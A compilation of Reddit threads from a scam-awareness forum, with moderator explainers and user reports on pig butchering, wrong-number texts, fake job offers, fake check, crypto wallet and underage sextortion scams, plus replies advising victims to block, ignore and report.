It is called [pig butchering](https://www.forbes.com/sites/jasonbrett/2023/12/26/new-pig-butchering-crypto-scam-includes-victims-in-us-and-overseas/?sh=2837fb975eaa) because scammers use intricate scripts to \"fatten up\" the victim (gaining their trust over days, weeks or months) before the \"slaughter\" (taking them for all of their money). This scam often starts with what appears to be a harmless wrong number text or message. When the victim responds to say it is the wrong number, the scammer tries to start a friendship with the victim. These conversations can be platonic or romantic in nature, but they all have the same goal- to gain the trust of the victim in order to get them ready for the crypto scam they have planned.

The scammer often claims to be wealthy and/or to have a wealthy family member who got wealthy investing, often in crypto currency. The victim is eventually encouraged to try out a (fake) crypto currency investment website, which will appear to show that they are earning a lot of money on their initial investment. The scammer may even encourage the victim to attempt a withdrawal that does go through, further convincing the victim that everything is legit. The victim is then pressured to invest significantly more money, even their entire net worth. Sometimes pig butchering scams don't involve crypto, but other means of sending money (like bank wires, gift cards or even cash pickups).

Eventually, the scammer will find an excuse why the account is frozen (e.g. for fraud, because supposed taxes are owed, etc) and may try to further extort the victim to give them even more money in order to gain access to the funds. By this time, the victim will never gain access and their money is gone. Many victims lose tens of thousands, hundreds of thousands, or even millions of dollars. Often, the scammers themselves are [victims of human trafficking](https://www.vice.com/en/article/n7zb5d/pig-butchering-scam-cambodia-trafficking), performing these scams under threats of violence. If you are caught up in this scam, it is important that you do not send any more money for any reason, and contact law enforcement to report it. Thanks to user Mediocre_Airport_576 for this script.

If you know someone involved in a pig butchering scam, sit down together to watch this video by Jim Browning to help them understand what's going on: https://youtu.be/vu-Y1h9rTUs -

- Yes. That seems to be the case. I have learned so much since I made this post and I am grateful for your response  üëç
- Just search this sub for 'romance,' dating' and 'online girlfriend'. It's about the scams, not the websites. Scammers are on every site where people are looking for love online.

Also watch a couple of socialcatfish videos on YouTube, you'll soon notice the patterns and scripts the romance scammers use.
- There weren't any nudes.
- I‚Äôm not mocking anyone and I‚Äôm sorry if that‚Äôs how this was taken.  It really surprises me, still does, that these kind of scams do work and people fall for them.  That‚Äôs it
- It's *human* loneliness. The approach to lonely women is phrased a little differently but it can be just as effective
- They didn't get any money from you, though.  You can't file a criminal report about someone who didn't  do anything to you, even if you think they are probably doing it to someone else. What happened to you was someone talked to you, convinced you to switch communication apps and then asked you to give them money, under what you assume to be false pretenses.  Everything you did you did of your own free will and anything you didn't want to do you didn't do.

Either way, there is no "recovery" of funds.  Most of these scammers are in foreign countries and thousands of miles away, in places that don't prosecute such things.  The answer is to educate people so they don't fall for these scams, as the after the scam options are basically nil.
- Reporting may make you feel better.

If you report to the platform that she's on, her account may be closed, but she'll set up another one.

Since you didn't lose any money, police / FBI will not do anything. Even if you had lost money, law enforcement can't do much except document what happened. You don't know her real name or location. Most of these scams are run by groups in southeast Asia or Africa, where they bring in money and pay the corrupt governments. Rarely are they arrested.
- Thank you! This is the kind of advice I needed. You know, everybody has blind spots. Apparently, this is one of mine.
- That's what I wanted to know. Now, if there were a police organization that could pursue these type of criminals, what would it take to organize and govern them? Would it have to be some kind of international treaty?
- Yeah, there isn't anything that is going into a Nigerian computer center and telling people to stop pretending to be a 22 year old DD cup with a great investment plan.

Apologies if I seem pissy.  It is not my intent at all.  I am glad you didn't get scammed.  Just if you look at this sub at all you will see people getting fooled by the exact same scams posted every day, but somehow thinking they are unique or special, and how could THEY get scammed.
- Perhaps if the right people make the case, then something will happen. Since 1/6/2021, I've listed to a lot of the Micheal Shermer Podcast. He's the founder of the Skeptic Society and publishes Skeptic Magazine. On occasion, he'll talk about the "Tinder Swindler." That was another thing in the back of my mind. 

She kept talking about her fancy life, such as her nice car and live-in maid. I guess I'm just a simple guy because I drive a dented Chevy and do my own chores and couldn't see having a servent.

I've done options trades before and knew that Cash App was not a trading platform. She wanted to do the transaction for me. I was like, "no, just give me the code for the option." She said that she would handle that and I was like, "bye!"

Title: Got one of those ‚Äúwrong number‚Äù text scams. Grain of salt, people. I
Body: Transcript:

Unknown Number (UN): Feeling good today?

Me: Might I ask who is speaking?

UN: Excuse me, are you Mary? I‚Äôm Daisy.

Me: No, I‚Äôm sorry, you have the wrong number. Have a good one!

UN: Sorry, I entered the wrong number. I hope you don‚Äôt mind.

Me: No problem.

UN: Thank you for your understanding. If you are not far from California, I can buy you a cup of coffee to apologize.

Me: I am very far from California, so no.

Daisy: Anyway, nice to meet you! I‚Äôm Daisy from California, and you?

Me: Aaand there it is. Sorry, ‚ÄúDaisy,‚Äù but this is where your scheme ends.

I then blocked the number and deleted the conversation. This has all the trappings of a ‚Äúwrong number‚Äù scam, in which the scammer randomly cold texts the victim, pretending to have simply texted the wrong number. Once they get a response, they get to work trying to keep the conversation going.

The first red flag, which I actually missed because it‚Äôs fairly easy to, was the way the texter opened the conversation. Most people open new text conversations **by identifying themselves.** e.g. ‚ÄúHi Ben, it‚Äôs Reed from work!‚Äù Beware text conversations that do not open with identification.

The next red flag was the way the texter apologized. Someone who actually texted the wrong number would apologize and then **end the conversation.** e.g. ‚ÄúOh, sorry. Have a nice day.‚Äù Not so here; the texter intentionally leaves the conversation open-ended.

Next, the texter dangles the promise of a free coffee and an in-person meeting. Someone who genuinely texted the wrong number wouldn‚Äôt do this, as **a wrong number text obviously isn‚Äôt enough of an inconvenience to warrant reparations with free food.** the scammer is trying to lure in lonely people with the idea of a date.

Lastly, after that rejection, the texter tries to establish a friendly rapport with the victim. Obviously, a genuine wrong number text wouldn‚Äôt get this far. If the texter does this, they‚Äôre trying to **gain your trust so they can fleece you later, under the pretense that you‚Äôre ‚Äúfriends‚Äù.** Do not believe them.

These scammers prey on your good will. Watch for these red flags to keep yourself safe from scams like this.

- I think they do it to see if the phone number is active. By answering you have just confirmed to them that your number is active and in use
- No woman in her right mind would offer to meet a total stranger to buy them coffee to "apologize" for texting the wrong number.

I really hope people are getting wise to this BS.
- Send them the website for the national human trafficking hotline, it shuts them right up

https://humantraffickinghotline.org/en/get-help
- A hilarious sign of a scammer is ‚Äúif you are not far from California‚Äù. This person clearly doesn‚Äôt realize that California is a massive place where two people can be a 10-hour drive apart and still both be ‚Äúnot far from California‚Äù.
- This is helpful, but I prefer to simply tell people to ignore calls and texts they don't recognize. Zero interaction except perhaps deleting the text without opening it. Period. For most people, there's no analytics needed there, it's just safe.
- Does anyone know what the actual scam is, what does the scammer stand to gain from these interactions?
- C'mon man. The best way to fight these is to not respond at all. Educate friends and family to not respond to "wrong numbers" like this. In this day and age of machine learning, anything you do is just going to train their system.

Besides, now you have confirmed that you have an active phone number and will just be targeted in the future.
- Don't talk to strangers in your texts or DMs
- "Not far from California" sure narrows it down. Yea, I'm Humboldt. You? San Diego! Sure drop on by for tea this afternoon. We'll talk about how we met because of that silly wrong number.
- Why even reply? Now your number will be passed around to other scammers as a live one.
- why did you respond to begin with? now you‚Äôre gonna keep getting attempted scams
- I got my first task scam one today.  They're out there grinding hard these days...
- Just ignore them.

I had some fun with mine too!
- ‚ÄúHi I am sorry to have bothered you. Here is a photo of me‚Äù

*random Asian model lady
- I pretend I recognize them as hookers I met the night before in Tijuana and want to meet again. They get offended very quickly.
- Excellent post! You explained that very well. Also, to me, the opening question gives away the fact that the person who texted you isn't a native English speaker, because I've never seen anyone text someone and open with "feeling good today?" üòÇ
- Good catch
- [removed]
- lol
- [deleted]
- I always reply to them in a random language using Google translate. Let them simmer for a bit, talk total nonsense and then shut them off or just admit I know they're trying to scam me and to improve their methods next time.
- That is correct.
- You have too much faith in people.
- this is what I do and it‚Äôs never not worked
- Don't all americans live in California?
- !pigbutchering or !wrongnumber
- I think the most common is a fattened pig scam ( I think that‚Äôs the name).  They befriend the mark and so there is problem on their end.  Can the mark please send some form of money to help out?
- A lot of them are just checking to see if the phone number is active. Which OP confirmed for them. Now OP will get a lot of scam calls over the next few months
- If the victim texts back the scammer will act like it's a happy, fateful accident that "she" mistakenly contacted someone she connects so well with! They won't ask for money at first, they'll just string the conversation along to gain the victim's trust and make them think they've made a new friend/girlfriend. Eventually the scammer will fall upon hard times of some sort (family member in jail, falling behind on rent, whatever) and ask the victim to send money. Or they'll say they plan to relocate to the victim's home country, but they need money for a plane ticket/bus ticket/etc. Either that or they will claim to have made themselves independently wealthy via crypto and will talk the victim into depositing money into a fake crypto site (aka the scammer's bank account).
- It can pivot to a variety of scams with romance/pig butchering being most common.

Read !wrongnumber below.
- Good rule, please don‚Äôt play with the wrong number texts.

My brother changed his phone number, a mutual friend texted him at the old number which had been reassigned.

The person that has the number now responded with a violent sexualized threat and it really upset her. 

Don‚Äôt engage, just ignore.
- This is also a good rule of thumb.

- Hi /u/Primary-Holiday-5586, AutoModerator has been summoned to explain the Fake crypto wallet scam.

Fake cryptocurrency websites and apps controlled by scammers are becoming more and more common. Sometimes the scam begins with a romance scammer who claims that they can help the victim invest in cryptocurrency. Victims are told to buy cryptocurrency of some kind using a legitimate cryptocurrency exchange, and then they are told to send their cryptocurrency to a website wallet address where it will be invested. Sometimes the scam begins with a notice that the victim won cryptocurrency on some website, in this case messages will often be sent through Discord.

In either case, the scammer controls the website, so they make it look like there is money in the victim‚Äôs account on their website. Then the scammer (or the scammer pretending to be someone official who is associated with the website) tells the victim that they have to put more money into the website before they can get their money out of the website. Of course all of the money sent by the victim has gone directly into the scammer‚Äôs wallet, and any additional money sent by the victim to retrieve their money from the website will also go directly into the scammer‚Äôs wallet, and all of the information about money being held by the website was totally fake.

If the scammer used Bitcoin, then you can report the scammer‚Äôs Bitcoin wallet address here: https://www.bitcoinabuse.com/reports. If the scammer used Ethereum, then you can report the scammer‚Äôs Ethereum wallet address here: https://info.etherscan.com/report-address/. You can see how much cryptocurrency has been sent to the scammer‚Äôs wallet address here: https://www.blockchain.com/explorer. Thanks to redditor nimble2 for this script.

Title: Barrage of spam texts/calls after auto accident: carcrashreports.com/[redacted]
Body: Is my Gmail account compromised? I've redacted personal information, and removed all phone numbers and links below.

I was the not-at-fault party in a very minor auto accident recently. Today, I downloaded my crash report from my state government's website and received my receipt in my Gmail account.

10 minutes after receiving my receipt via email, I received a text from an 844 number stating:

>"\[Redacted\], updated "AT-FAULT" information has posted for the 1/13/2025 case \[redacted\] involving 2016 Honda. Accident Timestamp 4:10 PM. Currently reporting Not Injured, verify details for corrections and changes --> \[website redacted\] - STOP to quit" (website in title of post)

Of course, I didn't do anything but report this to my ID theft protection company.

About 30 minutes after this, a spam call from a 469 number was filtered and automatically sent to voicemail with no message left by the caller.

Two minutes after this spam call, I received a text from a 346 number stating:

>"Please contact my office regarding recent MVA case#\[redacted\] to review estimate on damages of vehicle and review docs Max Ramirez \[phone number redacted\] Don't stop" (the same 469 number as the call)

I keep getting phone calls from a 432 number about every 10 minutes and by the voicemails being left it appears to be a real person. 

Again, I didn't do anything but report these texts and phone numbers. No one with this name or numbers is associated with my accident or claim.

It's oddly suspicious I received these texts within 10 minutes of downloading my crash report. Again, this transaction occurred on a secure government website, but the receipt containing the above information was received in my Gmail account.

Is it plausible my Gmail account is compromised? I don't have any email forwarding to other accounts or anything. I have multi-factor authentication, receive notifications of new logins, and see no other devices signed into my Gmail account. I see no way for anyone to have this information.

I changed my Gmail password regardless.

I'm also on a brand new computer with minimal use, no 3rd party apps installed, etc., so I don't see how someone could be "watching" my computer activity.

Title: Be aware of ''Karl Storz'' Scam
Body: This is my first time posting, but I felt compelled to share an unfortunate experience in the hopes of preventing others from falling victim. Recently, I encountered a potential scam involving individuals falsely claiming to represent Karl Storz. I was contacted by two individuals who identified themselves as HR and recruiting executives for the company. One claimed to be *Douglas McClain*, an HR Manager with seven years of tenure at Karl Storz, and the other identified as *Emily Carter*.

I initially received an email to schedule a Teams interview with Emily Carter residing in U.S. Pacific time zone, which took place in the morning 24 hours later and me being in U.S. EST time zone. The first interview phase consisted solely of answering written questions sent via Microsoft Teams, rather than using Zoom/video call or an official company platform, as I have experienced with other legitimate interviews. This, along with the three hour time difference immediately raised a red flag. Emily informed me that if selected, I would be contacted the following week for a second interview‚Äîa phone call with Douglas McClain.

The second interview with Douglas occurred Monday morning which presented further concerns. His call repeatedly disconnected, and there was a noticeable language barrier, though as a bilingual individual, I did not find the accent itself too concerning. What alarmed me more was that neither Douglas McClain nor Emily Carter had profiles on LinkedIn or Indeed, even though Karl Storz‚Äôs CEO and other employees did.

After the second interview, I received a job offer within 24 hours, along with a PDF attachment labeled as an "appointment letter" for onboarding. At this point, I decided to verify their credentials by contacting Karl Storz's headquarters in California using contact information from their official website. A representative kindly confirmed that there were no employees by those names or in the departments these individuals claimed to represent. The Karl Storz representative compassionately informed me that this was likely a scam.

To confirm my suspicions, I called Douglas and informed him that I had reached out to Karl Storz HQ to verify his and Emily's credentials. He became flustered, struggled to respond, and eventually claimed he was driving, though I could clearly hear the echo of a room. He then abruptly hung up on me.

I wanted to bring this matter to light to protect Karl Storz's reputation and help prevent other job seekers from being targeted. As the head of a household with a family, it is disheartening to experience something like this. However, my intention is to raise awareness and prevent scammers from finding another victim. I remain optimistic that my job search will lead to a legitimate and rewarding opportunity. In the meantime, I encourage everyone to stay safe, remain vigilant, and trust your instincts.

Comments:
- Should we know who Karl storz is? I'm confused.
- It‚Äôs a shame you had to get that far into the scheme to discover it is a scam. Usually with !job scams you can tell right away because either: 1.) The scammer contacts you unsolicited by text or email or 2.) The job posting is totally bogus (like the pay is too much for an entry-level remote position)
- Unless you‚Äôre in a very niche market/industry, or have an unusual job type being cold called about a job is probably going to be a scam. 

Always do your research before doing interviews for jobs you didn‚Äôt actually apply to.
- You do of course realize that all the names here are complete BS and made up right?
- You found two newbies, or two newbies found you, actually.. An experienced scammer won‚Äôt have gone that far loosing all that time on a qualified professional who sure would have checked or refused to pay anything in advance. They drop immediately as they realize they‚Äôre talking to somebody smart/aware/qualified enough to understand it‚Äôs a scam and move over to the next potential victim. As per your concerns, linkedin is full of fake company profiles with employees with authentic looking profiles, all fake. You can guess by the first line in their offers, it‚Äôs always a simple well paid task, just to butter easy minds up. That said, recruiters still call, but you can tell who‚Äôs after your business the way they introduce the matter.
- Is the contact unsolicited?
- Wow, this is so alarming! 

Scammers really know how to target people when they‚Äôre most vulnerable. It‚Äôs a good thing you trusted your gut and verified everything with the real company. 

Stories like this are such an important reminder for job seekers to be extra cautious.
- Great post & thank you!
- ƒ∞ dont get it. What kind of scam this is? Whats the catch. ƒ∞ mean, you avoided a trip, but what was their gain to trick yolu into it. Hide behind the bushes the laugh?

- It's a medical equipment manufacturing company.
- It's an international endoscopy company, I think.
- They make medical equipment. Mostly scopes and video equipment for medical procedures and surgery.
- K.S is a German medical tech company that's been in business since 1945, and they have offices internationally. Unfortunately, their name is being used by the scammers to bait victims on potential job offers. The scammers conduct 2-3 interviews, and then send you ''on-boarding'' documents to fill out for the job offer.
- Hi /u/ditzen, AutoModerator has been summoned to explain the Job scam.

Fake job scams come in many different varieties. The scammers will usually conduct interviews over Whatsapp, Telegram or Teams. They will offer high wages for the work being done, oftentimes with wildly varied wage ranges by hour, and they will \"hire\" you by telling you that you are hired, rather than going through the normal process that a company takes when hiring an employee in your country.

If they mention anything about a check or about receiving and sending out transactions, it is a [fake check scam](https://www.consumer.ftc.gov/blog/2018/09/anatomy-fake-check-scam). If they say they will cut you a check so you can buy equipment for remote work, it's a scam in which they make you purchase equipment on a fake website under their control, with your own card, and when the check bounces in a few weeks you're left holding the bag (and the equipment never comes)

If they mention anything about receiving, processing, or inspecting packages, it is a [parcel mule scam](https://en.wikipedia.org/wiki/Parcel_mule_scam).

If they ask you to purchase items up-front, ask you to pay a fee in order to be hired, or ask you to purchase gift cards, it is an [advance-fee scam](https://en.wikipedia.org/wiki/Advance-fee_scam). If they mention Bitcoin ATMs, [it's always a scam](https://coinatmradar.com/blog/avoid-scams-dont-use-bitcoin-atm-when-someone-asked-you/).

If the job involves posting advertisements on Facebook Marketplace, Craigslist or eBay, they are using you and your account to scam other people (especially if it's rental listings). Thanks to redditor AceyAceyAcey for this script.

- Teams, though. Teams usually is a small red flag for me.
- I've been actively job searching and applying extensively, so they caught me a bit off guard initially. Once my cup off coffee kicked in after that initial email, red flags started to pop up the more I researched. I couldn't find scamming post about Karl Storz so I was hesitant. Karl Storz is legitimate so it was a bit difficult to immediately be concerned. Hopefully my experience helps another victim save their time.
- Yeah the names immediately were the first signs that caused me to have skepticism, that's what lead me to research them on every platform available. This occurrence started last Friday A.M. and by Tuesday afternoon I was able to confirm the scam.
- Obviously... OP called the company and verified that.
- Great points! I'm always cautious and lookout for those listings/posts, but I'll definitely be even more aware now. Thanks for the insight.
- I've been actively applying for a new job for several weeks, so it was quite difficult to filter out the initial email about scheduling an introductory preliminary interview. I've had scamming attempts done to me and relatives before, and quickly have debunked them. This scam was slightly more sophisticated, but thankfully not enough! Luckily, no personal data was disclosed, just a little bit of lost time that will hopefully help protect other potential victims.
- Probably get your banking information or maybe to do a !fakecheck scam
- So after the 2nd/final phone interview, the next morning I received a phone call by their "HR department'' congratulating me on receiving the extended job offer. They mentioned they'd send me all of their on-boarding documents to fill out, which in shortly after that call I received an email to complete all the on-boarding questions asking for my personal data and direct deposit info. Having hired and on-boarded many employees before, that was the last straw that prompted me to call directly to HQ Karl Storz # that I found on that company's official website. That's when I spoke directly to an actual Karl Storz HR employee and confirmed no identities in their data base under those names.

- What a shitty scam.
- Happy cake day
- Why? My company uses teams
- It shouldn‚Äôt even get far enough for them to mention Teams, is what I‚Äôm trying to say.
- I assume that anyone using teams is not someone I want to deal with
- That happens sometimes... you get a scam that's not so easily identifiable as a scam, and it slips through the cracks of your scam armor. But it is certainly not a reflection on you, like that you're not sharp or something! It's just that as you said you're job-searching, which puts you in a vulnerable position, and they used a legit company & got a little lucky at first. But you beat them & helped save future would-be victims from falling prey to it.
- Correct, via on-boarding documents for obtaining the job. The on-boarding docs were a very basic PDF format, not a secured platform when usually on-boarding properly.
- Hi /u/mmmforme, AutoModerator has been summoned to explain the Fake check scam.

The fake check scam arises from many different situations (fake job scams, fake payment scams, etc), but the bottom line is always the same, you receive a check (a digital photo or a physical paper check), you deposit a check (via mobile deposit or via an ATM) and see the money in your account, and then you use the funds to give money to the scammer (usually through gift cards or crypto). Sometimes the scammers will ask you to order things through a site, but that is just another way they get your money.

Banks are legally obligated to make money available to you fast, but they can take their time to bounce it. Hence the window of time exploited by the scam. During that window of time the scammer asks you to send money back, because you are under the illusion that the funds cleared.

When the check finally bounces, the bank will take the initial deposit back, and any money you sent to the scammer will come out of your own personal funds. Usually the fake check deposit will be reversed in a few weeks, but it can also take several months. If you do not have the funds to cover the amount, your balance will go negative. Your bank will usually charge a fee for depositing a bad check, and your account may be closed depending on the severity of the scam. Here is an article from the FTC: https://www.consumer.ftc.gov/articles/how-spot-avoid-and-report-fake-check-scams, and here is an article from the New York Times: https://www.nytimes.com/2020/02/21/your-money/fake-check-scam.html

If you deposited a bad check, we recommend that you notify your bank immediately.

- They were starting some shit
- and they had to go deep to find it
- Yeah me too, nothing inherently suspicious about teams. Crypto trading via WhatsApp however...
- Happy cake day!
- That is unless you personally know people who use Teams.
- You are obviously very intelligent! Kudos on doing your due diligence in sniffing out that this was a fake job. I have no doubt a great company will soon snatch you up for the terrific job you deserve!
- 100%
- Correct, I‚Äôve used Teams in my previous management roles even to conduct interviews, before we transitioned to Zoom and other platforms. However, it was always done via video conference with our official company logos. Needless to say my skepticism kept growing, but I wanted to proceed cautiously to see if it was a legit job offer or help expose the potential scam.
- Thank you, I'm staying optimistic.

Title: topdashcamera.com appears to be a scam.
Body: UPDATE: After opening a complaint with the CA Atty Generals office yesterday morning, my dash cams arrived overnight today.

Ordered four Vigil dash cams Jan 4, delivery by Jan 10. Advertised as 'on sale' and found them through an online reference to being top rated by Consumer Reports. Received a receipt email the same day.

After receiving no delivery, I attempted to contact them via email and phone starting Jan 12 and continuing through today. Turns out the customer service email directed me to another company, 'shopbugzappers.com' and I received delivery failures. I tracked down the correct email, sent three add'l emails over the last two weeks that received receipts but no reply.

The initial receipt email had a USPS tracking number that failed in USPS' system. My son determined the number had one too many digits, so we tried removing the last '0' and it went through. However, the USPS site said 'label created, not yet picked up' and has remained so since Jan 4.

I called the customer service phone number 6 times and never got through the AI generated IVR. 

My gut tells me I've been scammed, so I opened an online complaint this morning (Jan 22) with the California Attorney General's office.

- ` WHOIS REPORT FOR TOPDASHCAMERA.COM `

This domain name was first registered only 17 months ago (Aug 2023), but it expires soon (Aug 2025). 

It is also concerning that they are using a "DNS proxy" (CloudFlare) which masks where the website's server actually is.

- Hi /u/seedless0, AutoModerator has been summoned to explain the Debt collection scam.

If you are positive the debt you're being accused of has never existed or has already been resolved, this is a scam. Keep in mind that companies can change names and debts can be sold, so not recognizing the company you owe isn't necessarily proof of a scam; you should call the company where the debt originated to confirm a debt exists. Be mindful of debt collection laws in your state or country before engaging in any conversation with a debt collection agency, to avoid being liable for debts that may be outside their statute of limitations for collections.

Like legitimate debt collectors, scam collectors may have access to your SSN, address, names of your contacts, etc. from a data breach. They may be calling your family, friends and employer relentlessly with invasive or embarrassing questions about you. They may send you threatening letters, emails and texts that state you will be sued or arrested if you don't immediately pay them X amount of dollars. These are scare tactics to rush you into paying before you have a chance to consider the situation logically. Instruct all of your contacts that this is fraud and to block the calls. If the scammers know a lot about you, you have potentially been involved in a serious data breach.

Here's a guide from r/identityTheft that covers the basics of credit freeze, IRS pins, even replacement SSN and police reports: https://www.reddit.com/r/IdentityTheft/comments/pqb1za/identity_theft_recovery_101/

You need to freeze your credit through the credit bureaus: https://www.reddit.com/r/IdentityTheft/comments/uvv3ij/psa_freezing_your_three_main_credit_reports_is/ and freeze your debit line with Chex Systems https://www.chexsystems.com/security-freeze/place-freeze

Title: Italian-style scam I guess... Can you please help?

They claim that I have to pay 45‚Ç¨ for unpaid internet bills. I know that I don't have unpaid bills because of course I checked my list and together with the ISP. I sent them proof but they keep calling and sending emails.

Is there something similar that you know of in your country? I don't remember I ever read of this specific type of scam here. Any help (from fellow Italians too!) will be much appreciated.

- These scammers were doing the same thing during the previous admins too, OP. Not anything new.
- Anyone who logically believes that the Border Patrol is tracking, holding or sending packages to anyone almost deserves what they get.

In what alternate universe is this legitimate?
- If anyone calls or visits you about you or at least your name being involved in any illegal activity, it's best not to talk to them anyway without legal help even if you are completely innocent.
- No package. US Border patrol does not deal with the mail. They deal with the people doing the illegal boarder crossings and ejecting Mexicans.
- There are also border patrol scams claiming a car rented in your name was found at the border with guns/drugs/bodies and you have to provide personal information.

Don‚Äôt fall for it.  The cops won‚Äôt tip you off if they think you committed a crime.
- Border patrol will never call you about a package. They also don‚Äôt care if you get a package. If it‚Äôs held up in customs, then it‚Äôs held up until it‚Äôs disposed of or retrieved via official means. 

If they claim that it has contraband, they‚Äôd investigate it as a crime. No law enforcement calls to claim you‚Äôre being investigated because that could initiate you attempting to destroy evidence. 

This scan will attempt to get you to pay a fine to prevent prosecution (which is also not something any law enforcement agency offers)

Title: Is "stop=end" a Ploy
Body: Many unwanted (by me) texts, often phishing or solicitation for political donations, end with "stop = end" meaning that if I reply with "stop" my number will be removed from their database.

However, I believe it is more likely that by replying with "stop," I notifying the sender that my phone number is indeed "live," therefore subjecting myself further solicitations. Instead, I simply choose not to reply.

Am I being paranoid? In *most cases*, does stop mean stop?


So, if you do not desire to receive additional texts, do you typically reply with "stop" if given this option?

- If they're coming from a legitimate organization, then yes, stop should actually put a stop to it.

The political donations are *usually* from legit organizations and PACs. Well, as legit as a PAC can be I suppose, but that's another discussion for another subreddit.
- It's an FTC requirement that you have a way to opt-out of messages if you're on a legitimate messaging list. Things like political organizations and non-profits, they mandate that they have to notify you that replying STOP will remove you from their lists.

If you're getting a message from a legit organization, it's fine. If it's a legit org, you should get a response that you've opted-out of their messages. If not, then just block and report spam anyways.
- In my experience, "stop" means: stop for awhile, then text from a different number.

So, a few years ago, I made some donations to a local political campaign. This put my email and phone on the lists for affiliated national political groups. During campaign season of 2024, I got a text asking me to donate to a candidate (not my local candidate). I replied with STOP. A few weeks later, another text from another candidate / campaign org. I replied with STOP. They just kept coming. In 2026, I expect to get another series of texts.
- In my experience, phishing texts do not have a stop = end suffix, political ones do.  Using Stop on the political ones work for the most part, but I know that my number has been given to 100 organizations, not just one.  Replying Stop only stops one of the 100.
- Same. I will never make a donation to a political campaign again if it requires anything more than disclosing my name, address, and my current employment status.
- So, is it safe to assume that if you do not desire to receive additional texts, you typically reply with "stop" if given this option?

I agree that phishing texts typically don't offer a "stop" option.
- Yes, it is safe to assume that.

The reviews and reddit posts about it are positive but there are only very few.

It's located in India. 

Anyone knows whether is authentic or not? Im mostly worried whether the therapists are qualified or not.

Title: Paypal Tiktok live scam?
Body: Today I was on TikTok and came across a live where a person was giving money via PayPal. I was interested and I saw that he was mostly sending it to gifters, so I gifted about 180 coins and the guy actually clicked on my profile, followed me and copied the username from PayPal and sent me the money. So far nothing has come of it but I'm scared because I'm not sure where he got the money from, is there a possibility that he could take some of my information, hack the account or something like that? The conversation with him on TikTok after the live suddenly ended was that he needed a favor from me and that was my TikTok account, I said no and that I didn't feel safe. Do you have any recommendations on what to do now, he said okay keep the money anyway I have 86B dollars, this is kind of disturbing my peace I'm scared can he do something to me and what should I do with the money if I ever receive it . I don't have any money on paypal account, should i just delete it?

- Scam. Never give someone money to get something like a prize, or money.  You will never get the money.

This is a very old scam, it's been around for a long time, way before internet or email or computers. This scam probably existed in ancient Greece 2500 years ago: I will give you a free goat. All you have to do is give me 20 drachmas for transportation and taxes.

And people have been falling victim to this forever, which is why con artists keep trying it.

You never get the prize, the free goat, the free money.
- Don‚Äôt spend the money it will be taken back, will be from a hacked account or stolen card.
- Wow thats very interesting and unbelievable. I would shake if i saw somebody transferring me lots of cash.

I wonder if this is really working. Write us if you received the money or he contacts you again please.
- Thank you
- And the copper is poor quality.
- I haven't received the money yet, it's "in preparation". If I haven't received the money yet and I don't care about that PayPal account, can I just delete and deactivate that account?
- They will ask for money off you, for you to receive their payment. Just block and move on.
- Can i send you screenshots of chat in private, i am so lost right now, i am feeling anxious
- Yes you can do, I honestly wouldn‚Äôt worry just don‚Äôt send them any info and just block them.
- Thank you, i sent you chat log if you could just review it, i will block him now on tiktok

Title: Kinda in deep on this Scam hoping for some help/advice
Body: So this started about a yr ago or so I was going through a major break up met someone on badoo said they were 22 on the app took it to text and they asked me about nipple piercings and sent me a tit pic. Come to find out that they were supposedly underage by a detective and their father found out and i was gonna get in trouble unless I helped with counseling. Then comes 6months of me sending them $$ paying off said counseling and turns out she committed suicide so hey we need you to send more money cause insurance won't pay in cases of suicide unless a police report was given. So they asked me to pay half. Recently I've been reading up on this subreddit and noticed a few scams sounding a lot like this one I've looked up both the detectives # and the so called father's # and both are Voip what are the chances this is fake vs real?

Edit #1 and done: Thanks for all the replies today I appreciate it big time. It'll take some time for my anxiety to go away from this but I'll definitely be more diligent. Thankfully I'm off the dating apps and have found someone i enjoy being with so pray I never have to go back to any of them again.

- This is a basic !underage scam.
- It‚Äôs a scam, stop sending money and block them, keep blocking till they stop.
- 100% chance this is fake. This is the !underage scam (see the automated reply). The girl, the parents, the detective, everyone you spoke to were all the same person. The whole scenario was faked in order to extort you for money. No one committed suicide. All of the scams you've read about the same as this one. **Block everyone involved immediately.** 

Since you sent them money already, they might be pretty aggressive at getting more. Just keep blocking everywhere they try to reach you.
- in addition to the other commenters' advice, ignore anyone who says they can get your money back. those are !recovery scammers
- Block them and move on.

There is no father, there is no woman, it's all fake to sucker you out of your money.
- You've been paying a scammer group for half a year. 

  
There's no "a few scams", this is perennially one of the most popular scams around.
- It's all fake. They are fake images. DO NOT RESPOND TO THEM. Just block and move on. There is no girl. There is no detective. There is no father. It's just a scammer begging for your money. Block and ignore.
- 100% fake/scam.
- 100% chance this is a scam and 0% chance it is real.
- The only thing real here is the money you sent these scammers
- Just to adding for clarification: there was never an underage (or other) paramour, just scammers pretending to be one.

Block and ignore.
- 100 percent fake. It is a VERY common scam. Also watch out for recovery scammers. You cannot get your money back.
- Of all the scams out there, this type is the biggest head-scratcher.  Not one thing about it makes sense.
- When you block these people, they're gonna be persistent.  You might get threats that they'll send the cartel after you.  You might get a seemingly random message from some guy offering to sell you rights to a gold mine somewhere.  You may get 'wrong number' text messages.  

You're an easy mark, and they know this now, they're going to keep trying to get money from you in various ways.
- If you already saw the outline of this very same thing spelled out elsewhere, what do you think the odds are that this is not a scam? You know the answer.
- You‚Äôve been scammed, but now you‚Äôre free. A regular person can‚Äôt buy their way out of a small crime by directly paying the underage victims parent. Block them and ignore anything they try. Do. Not. Respond. To. Anything.
- There's no girl,  no therapy,  no dead body.  You're sending money to a scammer. Just stop paying and block however they are contacting you.  You're never getting that money back.
- 123% fake. Stop paying.
- There is a zero percent chance this is real.

Block them. Ignore them. Stop sending them money.
- You‚Äôve been scammed for 6 months bro
- Chances of it fake? 100%

Do we need to do the chances of it real or can we just move on?
- Never should have paid the first time. After finding out she was supposedly underage simply block. You just block now. Don‚Äôt pay another dime.
- Bro‚Ä¶‚Ä¶ stop paying !!!! 
It‚Äôs not real.
- Pure scam.  You were taken for a ride.  Block all their attempts.

Ignore DMs, they are also scammers.

The money is gone, you will never get it back.

Consider it a lesson learned at the price you paid.  Now learn it.
- This is a scam. You did nothing wrong. Nothing you did was illegal. Don't pay anything more.

These scams are reported here every day. It's scary when it's your first, but this has happened to other people, hopefully that makes you feel less anxious. If you read through this sub, you'll see that they use the same script.

Real 17 year old girls don't kill themselves over nude photos. The girl, the fake police, the phony father -- all of them working together to blackmail you. And the scammers aren't in your state, or country -- these scams are run by groups in southeast Asia, or Africa.

Also, officers at your local police department aren't spending time calling people about sending nude pictures. If there was really a problem, someone would come and arrest you.
**Police do not accept money to make charges go away.** Well, in some countries with bad police corruption they probably do.

So, hopefully, you've learned a lesson: if a girl sends you nudes, or wants you to send her nudes, she is setting you up for a scam.
